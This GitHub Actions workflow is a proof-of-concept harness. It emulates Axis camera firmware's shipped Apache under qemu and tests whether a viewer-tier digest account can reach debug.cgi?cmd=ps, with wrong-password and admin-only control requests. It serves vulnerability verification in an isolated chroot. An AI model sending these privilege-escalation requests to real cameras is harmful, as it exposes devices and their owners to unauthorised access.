name: http-hop-poc
# Executed-proof harness (HTTP layer, HYP-AX-002): starts the SHIPPED Apache
# (httpd.apache2 + shipped /etc/apache2 configs) and dbox (debugar.cgi -n) under
# qemu-user inside the firmware chroot, then drives the full chain:
#   curl (viewer tier) -> Apache digest auth (axis-group-file, viewer group)
#   -> mod_trax Transfer /var/run/dbg-cgi/ctrl-cgi-socket -> dbox -> response.
# Only additions vs shipped config: the /run/apache2 runtime files that
# httpd-generate-config writes on device (parameters.conf Define block +
# failsafe default vhost for a cert-less device), and the auth data files
# user-manager writes (digest_auth_passwd/group_auth/basic_auth_passwd).
# No security directive is removed or weakened.
on:
  workflow_dispatch:
    inputs:
      firmware_url:
        description: "Official ftp.axis.com .bin URL"
        required: true
      firmware_sha256:
        description: "Expected SHA256 of the .bin"
        required: true

jobs:
  poc:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4

      - name: Install tooling
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq qemu-user-static zstd python3-pip gcc-aarch64-linux-gnu libc6-dev-arm64-cross strace
          python3 -m pip install --quiet PySquashfsImage zstandard

      - name: Download and verify official firmware
        run: |
          cd /tmp
          curl -sS -o fw.bin "${{ github.event.inputs.firmware_url }}"
          echo "${{ github.event.inputs.firmware_sha256 }}  fw.bin" | sha256sum -c -

      - name: Unpack container + extract rootfs (real symlinks)
        run: |
          cd /tmp
          python3 - <<'EOF'
          import gzip, tarfile, os, sys
          magic = open('fw.bin','rb').read(4)
          if magic[:2] == b'\x1f\x8b':
              raw = gzip.open('fw.bin','rb').read()
          elif magic == b'\x28\xb5\x2f\xfd':
              import zstandard
              raw = zstandard.ZstdDecompressor().stream_reader(open('fw.bin','rb')).read()
          else:
              sys.exit('unknown container magic %r' % magic)
          open('fw.tar','wb').write(raw)
          tf = tarfile.open('fw.tar'); tf.extractall('pkg')
          from PySquashfsImage import SquashFsImage
          img = SquashFsImage(open('pkg/rootfs.img','rb'))
          def sanitize(n):
              for c in '\\/:*?"<>|': n = n.replace(c,'_')
              return n
          def walk(node, outdir):
              name = node.name
              if isinstance(name, bytes): name = name.decode('utf-8','replace')
              path = os.path.join(outdir, sanitize(name))
              if node.is_dir:
                  os.makedirs(path, exist_ok=True)
                  for ch in node.iterdir():
                      try: walk(ch, path)
                      except Exception as e: print('walk fail', path, e)
                  return
              if node.is_symlink:
                  t = node.readlink()
                  if isinstance(t, bytes): t = t.decode('utf-8','replace')
                  try:
                      if os.path.lexists(path): os.remove(path)
                      os.symlink(t, path)
                  except (OSError, ValueError):
                      open(path + '.symlink','w').write(t)
                  return
              try: data = img.read_file(node.inode)
              except Exception as e:
                  print('read fail', path, e); return
              if data is None: return
              open(path,'wb').write(data)
              try: os.chmod(path, node.mode & 0o777)
              except OSError: pass
          os.makedirs('rootfs', exist_ok=True)
          for ch in img.root.iterdir(): walk(ch, 'rootfs')
          print('rootfs extracted')
          EOF
          sudo mv /tmp/rootfs /opt/rootfs

      - name: Provision chroot runtime dirs + runtime config (httpd-generate-config equivalents)
        run: |
          # dangling-symlink runtime dirs -> real dirs (device has tmpfs there)
          for p in var/run var/tmp var/volatile tmp run; do
            if [ -L "/opt/rootfs/$p" ]; then sudo rm -f "/opt/rootfs/$p"; fi
            sudo mkdir -p "/opt/rootfs/$p"
          done
          sudo mkdir -p /opt/rootfs/var/run/dbg-cgi
          sudo mkdir -p /opt/rootfs/run/apache2/virtualhosts
          # httpd.apache2's compiled-in default config file is /run/apache2/httpd.conf;
          # httpd-generate-config does: cp /etc/apache2/httpd.conf /run/apache2/httpd.conf
          sudo cp /opt/rootfs/etc/apache2/httpd.conf /opt/rootfs/run/apache2/httpd.conf
          # Apache DefaultRuntimeDir (ServerRoot=/usr -> /usr/logs): mutex/cgid socket dir
          sudo mkdir -p /opt/rootfs/usr/logs
          sudo chmod 1777 /opt/rootfs/tmp
          sudo mknod /opt/rootfs/dev/null c 1 3 2>/dev/null || true
          sudo mknod /opt/rootfs/dev/urandom c 1 9 2>/dev/null || true
          sudo mknod /opt/rootfs/dev/random c 1 8 2>/dev/null || true
          sudo mknod /opt/rootfs/dev/zero c 1 5 2>/dev/null || true
          sudo mknod /opt/rootfs/dev/console c 5 1 2>/dev/null || true
          sudo chmod 666 /opt/rootfs/dev/null /opt/rootfs/dev/urandom /opt/rootfs/dev/random /opt/rootfs/dev/zero 2>/dev/null || true
          # shm_open (mod_proxy slotmem) and APR shm need /dev/shm inside the chroot
          # (device: tmpfs); mod_proxy AH02478/AH00016 without it.
          sudo mkdir -p /opt/rootfs/dev/shm
          sudo chmod 1777 /opt/rootfs/dev/shm
          sudo mkdir -p /opt/rootfs/usr/logs/proxy

          # ---- /run/apache2/parameters.conf (replicates httpd-generate-config output;
          #      values = shipped defaults from /etc/conf.d/apache2 of this firmware) ----
          # Device default port is 80 (APACHE_PORT=80). No cert in chroot, so the
          # generator's own failsafe path (SECURE=0) serves HTTP + digest auth on 80.
          sudo tee /opt/rootfs/run/apache2/parameters.conf > /dev/null <<'EOF'
          Define APACHE_PORT 80
          Define HTTPS_PORT 443
          Define AXIS_REALM AXIS_0012345678
          Define AXIS_WS_REALM AXIS_WS_0012345678
          Define APACHE_KEEPALIVETIMEOUT_S 180
          Define APACHE_ACCESSLOG Off
          Define APACHE_PAGECOUNTTHROTTLE 5
          Define APACHE_SITECOUNTTHROTTLE 5
          Define APACHE_PAGEINTERVALTHROTTLE 30
          Define APACHE_SITEINTERVALTHROTTLE 30
          Define APACHE_BLOCKINGPERIODTHROTTLE 30
          Define MAX_WORKERS 35
          Define MIN_SPARE_THREADS 20
          Define MAX_SPARE_THREADS 55
          Define RTSP_TIMEOUT 180
          Define APACHE_DIGEST_NONCE_LIFETIME 5
          Define HTTP2_ENABLED
          Define H2 h2
          EOF

          # ---- /run/apache2/virtualhosts/vhosts.conf ----
          # Verbatim add_default_host() output from usr/share/apache2/virtualhost-config
          # for a device with no server certificate (HAS_HTTPS_CERT=no -> SECURE=0,
          # AUTH_TYPE=httpd-digest). This is where the shipped digest gate
          # (httpd-digest-auth.conf: /usr/html AuthType Digest + Require axis-group-file)
          # gets attached to the external listener.
          sudo tee /opt/rootfs/run/apache2/virtualhosts/vhosts.conf > /dev/null <<'EOF'
          <VirtualHost [::]:80>
            IncludeOptional /etc/apache2/conf.d/vhosts/external/*.conf
            ServerName default
            Include /etc/apache2/httpd-digest-auth.conf
            IncludeOptional /etc/apache2/conf.d/vhosts/all/*.conf
            IncludeOptional /etc/apache2/conf.d/vhosts/http/*.conf
            Include /etc/apache2/httpd-auth-preview-mode.conf
            IncludeOptional /run/apache2/customheaders.conf
          </VirtualHost>
          Listen 80
          EOF

          # ---- Auth data files user-manager writes (verified formats) ----
          # digest: user:realm:md5(user:realm:pass); realm = ${AXIS_REALM}
          sudo tee /opt/rootfs/etc/apache2/digest_auth_passwd > /dev/null <<'EOF'
          viewer1:AXIS_0012345678:9f6acf59dd3a4a4e5b22ce2e550ee38d
          admin1:AXIS_0012345678:3cf5bc700f9088ce9b396f00c867546b
          EOF
          # group_auth: tier groups (shipped template has admin:/operator:/viewer:/ptz:)
          sudo tee /opt/rootfs/etc/apache2/group_auth > /dev/null <<'EOF'
          admin: admin1
          operator:
          viewer: viewer1
          ptz:
          EOF
          # basic_auth_passwd (htpasswd): service accounts share this file on device
          SVC=$(openssl passwd -apr1 -salt axp0c 'servicepass')
          sudo printf 'storage:%s\n' "$SVC" | sudo tee /opt/rootfs/etc/apache2/basic_auth_passwd > /dev/null
          sudo chmod 644 /opt/rootfs/etc/apache2/digest_auth_passwd /opt/rootfs/etc/apache2/group_auth /opt/rootfs/etc/apache2/basic_auth_passwd

          sudo cp /usr/bin/qemu-aarch64-static /opt/rootfs/usr/bin/
          sudo ls -la /opt/rootfs/run/apache2/ /opt/rootfs/run/apache2/virtualhosts/
          echo "=== digest_auth_passwd ==="; sudo cat /opt/rootfs/etc/apache2/digest_auth_passwd
          echo "=== group_auth ==="; sudo cat /opt/rootfs/etc/apache2/group_auth

      - name: dbox + Apache + full HTTP chain (single session) with deep diagnostics
        id: chain
        continue-on-error: true
        run: |
          set +e
          echo "=== [D1] shared-lib resolution for httpd.apache2 ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /lib/ld-linux-aarch64.so.1 --list /usr/sbin/httpd.apache2 2>&1 | head -30
          echo "ld exit: $?"

          echo "=== [D2] foreground config test: httpd -t (stderr passthrough) ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/sbin/httpd.apache2 -t
          echo "configtest exit: $?"

          echo "=== [D3] start dbox (debugar.cgi -n) ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/sbin/debugar.cgi -n > /tmp/dbox.log 2>&1 &
          sleep 6
          sudo ls -la /opt/rootfs/var/run/dbg-cgi/ || true

          echo "=== [D4] start shipped Apache (httpd.apache2 -X, stderr host-side, no -E) ==="
          # ErrorLog redirect only (syslog:local1 unreachable in chroot); shipped
          # LogLevel kept intact for the proof run.
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/sbin/httpd.apache2 -X -c "ErrorLog /tmp/httpd-err2.log" > /tmp/httpd.log 2>&1 &
          UP=""
          for i in $(seq 1 14); do
            sleep 3
            L=$(sudo ss -ltn | grep -E ':80\b' || true)
            echo "poll $i: procs=$(pgrep -c -f 'qemu-aarch64.*httpd' || echo 0) listener=${L:-none}"
            if [ -n "$L" ]; then UP=1; echo ">>> LISTENER UP at poll $i"; break; fi
          done
          echo "=== processes ==="
          pgrep -af qemu-aarch64 | head -6 || true
          echo "=== /tmp/httpd.log (guest stderr, host side, verbatim) ==="
          cat /tmp/httpd.log 2>/dev/null | head -40
          if [ -z "$UP" ]; then
            echo "=== [T1] FOREGROUND probe: httpd -X, no -E (stderr = console; exit code) ==="
            timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/sbin/httpd.apache2 -X
            echo "T1 EXIT=$? (124 = ran until timeout = server works; else silent early death)"

            echo "=== [T3] HOST-SIDE strace -f of httpd -X under qemu (listener polled every 3s) ==="
            sudo strace -f -qq -s 120 -o /tmp/host-strace.log chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/sbin/httpd.apache2 -X > /tmp/httpd-t3.log 2>&1 &
            T3PID=$!
            for i in $(seq 1 12); do
              sleep 3
              L=$(sudo ss -ltn | grep -E ':80\b' || true)
              P=$(pgrep -c -f "qemu-aarch64.*httpd" || true)
              echo "poll $i: httpd_procs=$P listener=${L:-none}"
              if [ -n "$L" ]; then echo ">>> LISTENER UP at poll $i"; break; fi
            done
            sudo pkill -f "qemu-aarch64-static /usr/sbin/httpd.apache2" 2>/dev/null; sleep 1
            kill $T3PID 2>/dev/null
            echo "=== host strace: signals + process exits ==="
            grep -E "SIG(SEGV|ILL|BUS|ABRT|TERM)|exited with|+++ killed" /tmp/host-strace.log | head -20
            echo "=== host strace: guest-relevant syscalls (setuid/initgroups/clone/fork/exit_group) tail ==="
            grep -E "setuid|setgid|setgroups|initgroups|clone|fork|exit_group|rt_sigaction\(SIG" /tmp/host-strace.log | tail -40
            echo "=== host strace raw tail ==="
            sudo tail -30 /tmp/host-strace.log
            echo "--- T3 console (guest stderr) ---"
            cat /tmp/httpd-t3.log | head -20
          fi

          echo "=== PROOF SUITE (sequential; dbox crash-report lock needs settle time) ==="
          HOSTIP=$(hostname -I | awk '{print $1}')
          B="http://$HOSTIP"
          V6="http://[::1]"
          FW="http://$HOSTIP/axis-cgi/firmwaremanagement.cgi"

          echo "=== (1) NO-AUTH ps grammar: GET debug.cgi?cmd=ps (shipped gate directives active) ==="
          curl -sS -i --max-time 90 "$B/axis-cgi/debug/debug.cgi?cmd=ps" -o /tmp/resp_1_noauth_ps.txt 2>&1
          head -c 1100 /tmp/resp_1_noauth_ps.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_1_noauth_ps.txt)"
          sleep 20

          echo "=== (2) VIEWER TIER digest: viewer1 GET debug.cgi?cmd=ps -> mod_trax -> dbox ==="
          curl -sS -i --digest --max-time 90 -u viewer1:viewer1pass "$B/axis-cgi/debug/debug.cgi?cmd=ps" -o /tmp/resp_2_viewer_ps.txt 2>&1
          head -c 1100 /tmp/resp_2_viewer_ps.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_2_viewer_ps.txt)"
          sleep 20

          echo "=== (3) WRONG PASSWORD control: viewer1/badpass digest GET debug.cgi?cmd=ps ==="
          curl -sS -i --digest --max-time 90 -u viewer1:WRONGPASS "$B/axis-cgi/debug/debug.cgi?cmd=ps" -o /tmp/resp_3_badpass.txt 2>&1
          head -c 700 /tmp/resp_3_badpass.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_3_badpass.txt)"
          sleep 20

          echo "=== (4) VIEWER TIER digest in-chroot: viewer1 via [::1] GET debug.cgi?cmd=ps ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/curl -sS -i --digest --max-time 90 -u viewer1:viewer1pass "$V6/axis-cgi/debug/debug.cgi?cmd=ps" -o /tmp/resp_e_inchroot.txt 2>&1
          sudo cp /opt/rootfs/tmp/resp_e_inchroot.txt /tmp/resp_e_inchroot.txt 2>/dev/null
          head -c 1100 /tmp/resp_e_inchroot.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_e_inchroot.txt)"
          sleep 20

          echo "=== (5) CONTROL: viewer1 digest on firmwaremanagement.cgi (admin-only CGI) ==="
          curl -sS -i --digest --max-time 60 -u viewer1:viewer1pass "$FW" -o /tmp/resp_5_firmware_viewer.txt 2>&1
          head -c 500 /tmp/resp_5_firmware_viewer.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_5_firmware_viewer.txt)"
          sleep 5

          echo "=== (6) CONTROL compare: admin1 digest on firmwaremanagement.cgi ==="
          curl -sS -i --digest --max-time 60 -u admin1:admin1pass "$FW" -o /tmp/resp_6_firmware_admin.txt 2>&1
          head -c 500 /tmp/resp_6_firmware_admin.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_6_firmware_admin.txt)"

          echo "=== identity facts: apache worker + dbox ==="
          pgrep -af qemu-aarch64 | head -6
          sudo ss -ltnp 2>/dev/null | grep -E ':80\b' || true
          sudo ls -la /opt/rootfs/var/run/dbg-cgi/
          echo "=== apache error log (Level=shipped; ErrorLog redirected to file) tail ==="
          sudo tail -40 /opt/rootfs/tmp/httpd-err2.log 2>/dev/null
          echo "=== dbox log ==="
          sudo cat /tmp/dbox.log 2>/dev/null | head -20
          echo "=== response artifacts ==="
          wc -c /tmp/resp_*.txt 2>/dev/null

      - name: Archive logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: http-hop-poc-logs
          path: |
            /tmp/httpd.log
            /opt/rootfs/tmp/httpd-err2.log
            /tmp/dbox.log
            /tmp/resp_1_noauth_ps.txt
            /tmp/resp_2_viewer_ps.txt
            /tmp/resp_3_badpass.txt
            /tmp/resp_e_inchroot.txt
            /tmp/resp_5_firmware_viewer.txt
            /tmp/resp_6_firmware_admin.txt
          if-no-files-found: ignore
